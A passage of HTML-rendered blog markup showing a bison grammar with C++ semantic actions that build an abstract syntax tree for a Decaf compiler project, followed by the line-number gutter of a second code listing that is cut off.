class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type-&gt;get_type());</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalues: lvalue T_COMMA lvalues &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList*)$<span class="number">3</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$=<span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | lvalue &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$=<span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalue: T_ID &#123; decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ;$$ = var; <span class="keyword">delete</span> $<span class="number">1</span>;&#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ; </span><br><span class="line">        decafAllexp* arr = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        var-&gt;put_arr(arr);</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Array(&quot;</span>+arr-&gt;get_name()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        $$ = var; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">CONSTANT : T_INTCONSTANT | T_CHARCONSTANT | T_STRINGCONSTANT &#123; &#125;;</span><br><span class="line"></span><br><span class="line">method_decls: method_decl method_decls&#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafStmtList * block = (decafStmtList*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">blockt: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmtList *state = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafStmtList *field = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafStmtList *state = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmtList *state = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafStmtList *field = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafStmtList *state = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statements: statement statements &#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statement: blockt &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | assign T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | method_call T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_return T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_if &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_while &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_for &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_break T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_continue T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_if: T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt T_ELSE blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafBlock *else_block = (decafBlock *)$<span class="number">7</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,else_block);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_while: T_WHILE T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafWhile *whiles = <span class="keyword">new</span> decafWhile(<span class="built_in">exp</span>,block);</span><br><span class="line">        $$ = whiles;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_for: T_FOR T_LPAREN assignss T_SEMICOLON <span class="built_in">exp</span> T_SEMICOLON assignss T_RPAREN blockt&#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">9</span>;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssignList *aslist2 = (decafAssignList *)$<span class="number">7</span>; </span><br><span class="line">        decafFor * fors = <span class="keyword">new</span> decafFor(<span class="built_in">exp</span>,block,aslist,aslist2);</span><br><span class="line">        $$ = fors;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_break: T_BREAK &#123;</span><br><span class="line">        decafOutput * data = <span class="keyword">new</span> decafOutput(<span class="string">&quot;BreakStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_continue: T_CONTINUE &#123;</span><br><span class="line">        decafOutput * data = <span class="keyword">new</span> decafOutput(<span class="string">&quot;ContinueStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_return: T_RETURN T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="built_in">exp</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN T_LPAREN T_RPAREN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assignss : assigns &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assigns: assign T_COMMA assigns &#123;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    | assign &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assign: lvalue T_ASSIGN <span class="built_in">exp</span> &#123;</span><br><span class="line">        decafVar* var = (decafVar *)$<span class="number">1</span>;</span><br><span class="line">        decafAllexp* <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        decafAssign* ass = <span class="keyword">new</span> decafAssign(var-&gt;get_name(),<span class="built_in">exp</span>,<span class="literal">NULL</span>);</span><br><span class="line">        ass-&gt;put_arr(var-&gt;get_arr());</span><br><span class="line">        $$ = ass;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> : T_ID &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;VariableExpr&quot;</span>); $$ = <span class="built_in">exp</span>; <span class="keyword">delete</span> $<span class="number">1</span>;&#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        decafArrexp * arr = <span class="keyword">new</span> decafArrexp(*$<span class="number">1</span>,<span class="built_in">exp</span>); </span><br><span class="line">        $$ = arr; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_INTCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_CHARCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_STRINGCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;StringConstant&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_TRUE &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;True&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_FALSE &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;False&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | method_call &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | T_NOT <span class="built_in">exp</span> &#123; decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;Not&quot;</span>, (decafAllexp*)$<span class="number">2</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_MINUS <span class="built_in">exp</span> %prec T_UMINUS &#123; decafUnaryexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafUnaryexp(<span class="string">&quot;UnaryMinus&quot;</span>, (decafAllexp*)$<span class="number">2</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_PLUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Plus&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MINUS <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Minus&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MULT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mult&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_DIV <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Div&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_MOD <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Mod&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEFTSHIFT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leftshift&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_RIGHTSHIFT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Rightshift&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Geq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Lt&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GT <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Gt&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_EQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Eq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_NEQ <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Neq&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_AND <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;And&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_OR <span class="built_in">exp</span> &#123; decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Or&quot;</span>, (decafAllexp*)$<span class="number">1</span>, (decafAllexp*)$<span class="number">3</span>); $$ = <span class="built_in">exp</span>; &#125;</span><br><span class="line">    | T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_call: T_ID T_LPAREN para_list_use T_RPAREN &#123;</span><br><span class="line">        decafFunCall *call = <span class="keyword">new</span> decafFunCall();</span><br><span class="line">        decafStmtList* para = (decafStmtList*)$<span class="number">3</span>;</span><br><span class="line">        call-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        call-&gt;put_para(para-&gt;get_para());</span><br><span class="line">        $$ = call;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">  <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">  <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中用到的类与函数如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span 